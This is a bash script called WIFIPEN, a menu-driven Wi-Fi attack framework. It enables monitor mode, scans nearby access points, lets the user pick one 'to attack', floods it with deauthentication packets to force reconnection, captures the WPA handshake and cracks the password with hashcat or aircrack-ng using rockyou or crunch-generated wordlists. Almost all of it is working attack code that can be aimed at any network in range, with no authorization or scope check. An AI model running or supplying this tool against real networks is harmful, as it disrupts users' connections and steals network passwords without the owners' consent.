#!/usr/bin/env bash
# ============================================================================
#  WIFIPEN — Bash Wi‑Fi Penetration Framework
# ============================================================================
#  Version: 1.9 (Stable)
#  Goal: A user-friendly, robust framework for Wi-Fi penetration testing.
# ============================================================================
set -Euo pipefail
trap cleanup SIGINT SIGTERM EXIT

# ========== GLOBALS ==========
WORKDIR="$(pwd)"
TMP_DIR="$WORKDIR/tmp"
CAPTURE_DIR="$WORKDIR/captures"
LOG_DIR="$WORKDIR/logs"
WORDLIST=""
INTERFACE=""

# For background process tracking
CAP_PID=""

# Color Codes
GREEN="\e[32m"
RED="\e[31m"
YELLOW="\e[33m"
NC="\e[0m"

# ========== LOGGING ==========
log() {
  local ts="[$(date +"%H:%M:%S")]"
  # Use -e flag with echo to interpret backslash escapes (for colors)
  echo -e "$ts $*" | tee -a "$LOG_DIR/wifipen_$(date +"%F").log"
}

# ========== CLEANUP ==========
cleanup() {
  trap - SIGINT SIGTERM EXIT
  echo
  # Ensure there's a process to kill before attempting
  if [[ -n "${CAP_PID:-}" && -e /proc/$CAP_PID ]]; then
      log "${YELLOW}[*] Killing background capture process: $CAP_PID...${NC}"
      sudo kill -9 "$CAP_PID" 2>/dev/null || true
  fi
  
  if [[ -n "${INTERFACE:-}" ]]; then
    log "${YELLOW}[*] Resetting interface $INTERFACE to managed mode...${NC}"
    sudo ip link set "$INTERFACE" down 2>/dev/null || true
    sudo iw "$INTERFACE" set type managed 2>/dev/null || true
    sudo ip link set "$INTERFACE" up 2>/dev/null || true
  fi
  
  # Remove temporary files
  rm -rf "$TMP_DIR"
  
  # Restore terminal to a sane state
  stty sane
  log "${GREEN}[+] Cleanup complete. Exiting.${NC}"
  exit 130
}

# ========== DEPENDENCIES ==========
check_dependencies() {
    log "${YELLOW}[*] Checking dependencies...${NC}"
    required_tools=(aircrack-ng airodump-ng aireplay-ng iw crunch hcxpcapngtool hcxtools john hashcat)
    missing=()

    for tool in "${required_tools[@]}"; do
        if ! command -v $tool &>/dev/null; then
            missing+=("$tool")
        fi
    done

    if [ ${#missing[@]} -gt 0 ]; then
        log "${RED}[!] Missing dependencies: ${missing[*]}${NC}"
        read -rp "Install them now? [y/N] " ans
        if [[ "$ans" =~ ^[Yy]$ ]]; then
            sudo apt-get update && sudo apt-get install -y "${missing[@]}"
        else
            log "${RED}[!] Please install the missing packages first.${NC}"
            return 1
        fi
    fi
    log "${GREEN}[+] All essential dependencies appear to be installed.${NC}"
}


# ========== WORDLIST HANDLING (SIMPLIFIED LOGIC) ==========
create_wordlist() {
    log "${YELLOW}[*] Creating a custom wordlist using crunch...${NC}"
    log "[*] The generated part will use uppercase, lowercase, and numbers (A-Z, a-z, 0-9)."
    read -rp "Enter a prefix/starting string (can be empty): " prefix
    local prefix_len=${#prefix}

    # Auto-detect minimum length based on prefix, as requested.
    local default_min=$((prefix_len > 0 ? prefix_len : 8))
    read -rp "Enter minimum total length (>= ${prefix_len}, default: ${default_min}): " min
    min=${min:-${default_min}}

    # Use a sensible default for max length
    read -rp "Enter maximum total length (>= ${min}, default: 10): " max
    max=${max:-10}

    # Validation
    if (( min < prefix_len )); then
        log "${RED}[!] Minimum length ($min) cannot be less than the prefix length ($prefix_len).${NC}"; return
    fi
    if (( max < min )); then
        log "${RED}[!] Maximum length ($max) must be greater than or equal to minimum length ($min).${NC}"; return
    fi
    
    read -rp "Enter output file name (e.g., mylist.txt): " wordlist_file
    wordlist_file="${wordlist_file:-customlist.txt}"
    local output_path="$WORKDIR/$wordlist_file"

    # Define the character set to be appended after the prefix
    local charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    
    # Clear the output file to start fresh
    > "$output_path"
    
    log "${YELLOW}[*] Generating wordlist for prefix '$prefix' from length $min to $max...${NC}"

    for ((len=min; len<=max; len++)); do
        # If the desired length is just the prefix length, just add the prefix.
        if (( len == prefix_len )); then
            if [[ -n "$prefix" ]]; then # Only add if prefix is not empty
                log "[*] Adding prefix '$prefix' of length $len to wordlist..."
                echo "$prefix" >> "$output_path"
            fi
            continue
        fi

        # Build the pattern string for the current length, e.g., "kali@@@@"
        local pattern="$prefix"
        local random_chars_len=$((len - prefix_len))
        for ((i=0; i<random_chars_len; i++)); do
            pattern+="@"
        done

        log "[*] Generating and appending passwords of length $len..."
        # CORRECTED SYNTAX: The charset string must come BEFORE the -t option.
        crunch "$len" "$len" "$charset" -t "$pattern" >> "$output_path"
    done
    
    if [[ -s "$output_path" ]]; then
        log "${GREEN}[+] Wordlist successfully saved to '$output_path'${NC}"
        WORDLIST="$output_path"
        log "[+] New wordlist '$WORDLIST' is now selected."
    else
        log "${RED}[!] Failed to create wordlist or the resulting file is empty.${NC}"
    fi
}


select_wordlist() {
    mapfile -t list < <(find "$WORKDIR" -maxdepth 1 -type f -name "*.txt")
    if [[ -f /usr/share/wordlists/rockyou.txt.gz && ! -f $WORKDIR/rockyou.txt ]]; then
        log "${YELLOW}[*] Found compressed rockyou.txt.gz. Decompressing it may improve performance.${NC}"
        read -rp "Decompress now? [y/N] " ans
        if [[ "$ans" =~ ^[Yy]$ ]]; then
            gunzip -c /usr/share/wordlists/rockyou.txt.gz > "$WORKDIR/rockyou.txt"
            log "${GREEN}[+] Decompressed to $WORKDIR/rockyou.txt${NC}"
            list+=("$WORKDIR/rockyou.txt")
        fi
    fi
    # Add rockyou.txt from the standard path if it exists
    if [[ -f "/usr/share/wordlists/rockyou.txt" && ! " ${list[*]} " =~ " /usr/share/wordlists/rockyou.txt " ]]; then
        list+=("/usr/share/wordlists/rockyou.txt")
    fi

    if (( ${#list[@]} == 0 )); then
        log "${RED}No .txt wordlists found.${NC}"
        read -rp "Download the popular rockyou.txt wordlist? (~134MB) [y/N] " ans
        if [[ "$ans" =~ ^[Yy]$ ]]; then
            wget -O "$WORKDIR/rockyou.txt" https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
            list+=("$WORKDIR/rockyou.txt")
        else
            return 1
        fi
    fi
    
    echo "Please select a wordlist:"
    select wl in "${list[@]}" "Enter path manually"; do
        if [[ "$REPLY" == "$((${#list[@]} + 1))" ]]; then
            read -rp "Enter full path to your wordlist file: " custom_path
            if [[ -f "$custom_path" ]]; then
                WORDLIST="$custom_path"
                log "${GREEN}[+] Using wordlist: $WORDLIST${NC}"
                break
            else
                log "${RED}[!] File not found at $custom_path${NC}"
            fi
        elif [[ -n "$wl" ]]; then
            WORDLIST="$wl"
            log "${GREEN}[+] Using wordlist: $WORDLIST${NC}"
            break
        else
            echo "Invalid selection."
        fi
    done
}


# ========== MENU ACTIONS ==========
select_interface() {
    echo "Available wireless interfaces:"
    mapfile -t interfaces < <(iw dev | awk '$1=="Interface"{print $2}')
    if ((${#interfaces[@]} == 0)); then
        log "${RED}[!] No wireless interfaces found.${NC}"
        return 1
    fi
    select iface in "${interfaces[@]}"; do
        if [[ -n "$iface" ]]; then
            INTERFACE="$iface"
            log "${YELLOW}[*] Enabling monitor mode on $INTERFACE...${NC}"
            sudo ip link set "$INTERFACE" down
            sudo iw "$INTERFACE" set monitor control
            sudo ip link set "$INTERFACE" up
            if iwconfig "$INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
                log "${GREEN}[+] Monitor mode enabled successfully on $INTERFACE.${NC}"
            else
                log "${RED}[!] Failed to enable monitor mode on $INTERFACE. Please try manually.${NC}"
                INTERFACE="" # Reset on failure
            fi
            break
        else
            echo "Invalid selection."
        fi
    done
}

scan_and_capture() {
    if [[ -z "$INTERFACE" ]]; then
        log "${RED}[!] Cannot scan. Please select an interface first (Option 4).${NC}"; return 1
    fi

    local scan_prefix="$TMP_DIR/scan"
    log "${YELLOW}[*] Scanning for networks for 15 seconds (Press Ctrl+C to stop scan early)...${NC}"
    sudo timeout 15s airodump-ng --write "$scan_prefix" --output-format csv "$INTERFACE" > /dev/null 2>&1

    local scan_file="$scan_prefix-01.csv"
    if [[ ! -s "$scan_file" ]]; then
        log "${RED}[!] airodump-ng failed or no networks were detected.${NC}"; return 1
    fi

    echo -e "\n${GREEN}--- Available Networks ---${NC}"
    local AP_LIST=()
    local client_section_found=false
    while IFS=, read -r bssid fts lts channel speed privacy cipher auth power beacons iv lan_ip id_len essid key; do
        if [[ "$bssid" == "Station MAC" ]]; then client_section_found=true; continue; fi
        [[ "$bssid" == "BSSID" || -z "$bssid" || "$client_section_found" == true ]] && continue
        essid=$(echo "$essid" | xargs); bssid=$(echo "$bssid" | xargs); channel=$(echo "$channel" | xargs)
        if [[ -n "$bssid" && -n "$essid" ]]; then
            AP_LIST+=("$bssid|$channel|$essid"); idx=${#AP_LIST[@]}
            echo "$idx) ESSID: $essid | BSSID: $bssid | CH: $channel"
        fi
    done < "$scan_file"

    if [[ ${#AP_LIST[@]} -eq 0 ]]; then log "${RED}[!] No networks found in scan results.${NC}"; return 1; fi

    read -rp "Pick AP number to attack: " choice
    if ! [[ "$choice" =~ ^[0-9]+$ ]] || (( choice > ${#AP_LIST[@]} || choice < 1 )); then
        log "${RED}[!] Invalid selection.${NC}"; return 1
    fi
    
    IFS='|' read -r bssid channel essid <<< "${AP_LIST[$((choice-1))]}"
    
    local safe_essid="${essid//[^a-zA-Z0-9]/_}"
    read -rp "Enter name for capture file [${safe_essid}]: " filename
    local cap_base="$CAPTURE_DIR/${filename:-$safe_essid}"
    local airodump_log="$LOG_DIR/airodump.log"

    > "$airodump_log"

    log "${YELLOW}[*] Capturing handshake for ESSID: '$essid' on channel $channel...${NC}"
    log "[*] Target BSSID: $bssid | Saving to ${cap_base}-01.cap"
    
    sudo airodump-ng --bssid "$bssid" -c "$channel" -w "$cap_base" --output-format cap "$INTERFACE" > "$airodump_log" 2>&1 &
    CAP_PID=$!

    log "${YELLOW}[*] Sending deauth packets to speed up capture...${NC}"
    (sudo aireplay-ng --deauth 20 -a "$bssid" "$INTERFACE" >/dev/null 2>&1) &
    local deauth_pid=$!

    local found=0
    echo -n "[*] Watching for EAPOL handshake... "
    local spinner="/|\\-"
    for i in $(seq 1 80); do # Increased wait time to 40 seconds (80 * 0.5s)
        if grep -q "EAPOL" "$airodump_log"; then
            found=1; break
        fi
        if sudo aircrack-ng "${cap_base}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
             found=1; break
        fi
        printf "\b${spinner:i%4:1}"
        sleep 0.5
    done
    
    # Clean up the spinner line and restore cursor
    printf "\b \b\n"
    
    # Ensure background processes are killed and suppress "Killed" message
    sudo kill -9 $CAP_PID 2>/dev/null
    wait $CAP_PID 2>/dev/null
    sudo kill -9 $deauth_pid 2>/dev/null
    CAP_PID=""

    # Restore terminal to a fully sane state
    stty sane
    
    if [[ $found -eq 1 ]]; then
        log "${GREEN}[+] Handshake Captured!${NC}"
        local capfile="${cap_base}-01.cap"
        log "[+] Capture file saved: $capfile"
        local hc22000_file="${cap_base}.hc22000"
        if hcxpcapngtool -o "$hc22000_file" "$capfile" >/dev/null 2>&1; then
            log "${GREEN}[+] Converted to Hashcat .hc22000 format: $hc22000_file${NC}"
        fi
        echo "Use Option 6 to crack this file."
    else
        log "${RED}[!] Failed to capture handshake. Try moving closer or running the attack again.${NC}"
    fi
}

crack_handshake() {
    if [[ -z "$WORDLIST" ]]; then log "${RED}[!] Cannot crack. Please select a wordlist first (Option 3).${NC}"; return 1; fi

    mapfile -t files < <(find "$CAPTURE_DIR" -type f \( -name "*.hc22000" -o -name "*.cap" \))
    if ((${#files[@]} == 0)); then log "${RED}[!] No .hc22000 or .cap files found in '$CAPTURE_DIR'.${NC}"; return; fi
    
    echo "Select a file to crack:"
    select capfile in "${files[@]}"; do
        [[ -n "$capfile" ]] && break || echo "Invalid selection."
    done

    local hc22000_file
    if [[ "$capfile" == *.cap ]]; then
        hc22000_file="${capfile%.cap}.hc22000"
        if [[ ! -f "$hc22000_file" ]]; then
            log "${YELLOW}[*] Converting .cap to .hc22000 format...${NC}"
            if ! hcxpcapngtool -o "$hc22000_file" "$capfile" >/dev/null 2>&1; then
                log "${RED}[!] Conversion failed. The .cap file might not contain a valid handshake.${NC}"; return 1
            fi
        fi
    else
        hc22000_file="$capfile"
    fi

    echo ""
    log "[?] Choose cracking method:"
    echo " 1) Hashcat (GPU Recommended)"
    echo " 2) Aircrack-ng (CPU, on .cap file)"
    read -rp ">>> " method

    case $method in
        1)
            log "${YELLOW}[*] Running Hashcat against '$hc22000_file'...${NC}"
            hashcat -m 22000 "$hc22000_file" "$WORDLIST" --force
            log "${GREEN}[+] Hashcat run finished. Checking for cracked password...${NC}"
            hashcat -m 22000 "$hc22000_file" --show
            ;;
        2)
            local original_cap="${hc22000_file%.hc22000}.cap"
            if [[ ! -f "$original_cap" ]]; then
                log "${RED}[!] Original .cap file not found for Aircrack-ng.${NC}"; return 1
            fi
            log "${YELLOW}[*] Running Aircrack-ng against '$original_cap'...${NC}"
            aircrack-ng -w "$WORDLIST" "$original_cap"
            ;;
        *) log "${RED}[!] Invalid choice.${NC}";;
    esac
}

# ========== MAIN MENU ==========
main() {
  if [[ $EUID -ne 0 ]]; then
      echo "This script requires root privileges for network operations."
      sudo -v || { echo "Sudo privileges not granted. Exiting."; exit 1; }
  fi
  
  clear
  mkdir -p "$TMP_DIR" "$CAPTURE_DIR" "$LOG_DIR"
  log "======== WIFIPEN FRAMEWORK STARTED (v1.9) ========"

  # Initial wordlist check
  if [[ -z "$WORDLIST" ]]; then
      default_wordlist="/usr/share/wordlists/rockyou.txt"
      [[ -f "$default_wordlist" ]] && WORDLIST="$default_wordlist" && log "[*] Default wordlist found and selected: $WORDLIST"
  fi

  while true; do
    # Dynamic Menu Logic
    local scan_status="${GREEN}Enabled${NC}"
    local crack_status="${GREEN}Enabled${NC}"
    if [[ -z "$INTERFACE" ]]; then scan_status="${RED}Disabled (No Interface)${NC}"; fi
    if [[ -z "$WORDLIST" ]] || ! ls -A "$CAPTURE_DIR"/* &>/dev/null; then crack_status="${RED}Disabled (No Wordlist/Captures)${NC}"; fi

    echo -e "\n${GREEN}==== WIFIPEN FRAMEWORK ====${NC}"
    echo -e "Interface: ${YELLOW}${INTERFACE:-Not Set}${NC} | Wordlist: ${YELLOW}${WORDLIST:-Not Set}${NC}"
    echo "=========================================="
    echo " 1) Check/Install Dependencies"
    echo " 2) Create Wordlist (Crunch)"
    echo " 3) Select Wordlist"
    echo " 4) Select Interface & Enable Monitor"
    echo -e " 5) Scan & Capture Handshake  - [Status: $scan_status]"
    echo -e " 6) Crack Existing Handshake    - [Status: $crack_status]"
    echo " 7) Exit"
    echo "=========================================="
    read -rp "Select option: " opt
    case "$opt" in
      1) check_dependencies ;;
      2) create_wordlist    ;;
      3) select_wordlist    ;;
      4) select_interface   ;;
      5) [[ "$scan_status" == *"${GREEN}"* ]] && scan_and_capture || log "${RED}[!] Option is disabled. Please select an interface first.${NC}" ;;
      6) [[ "$crack_status" == *"${GREEN}"* ]] && crack_handshake || log "${RED}[!] Option is disabled. Please select a wordlist AND ensure capture files exist.${NC}" ;;
      7) cleanup ;;
      *) echo "Invalid option." ;;
    esac
  done
}

# Start the main function
main
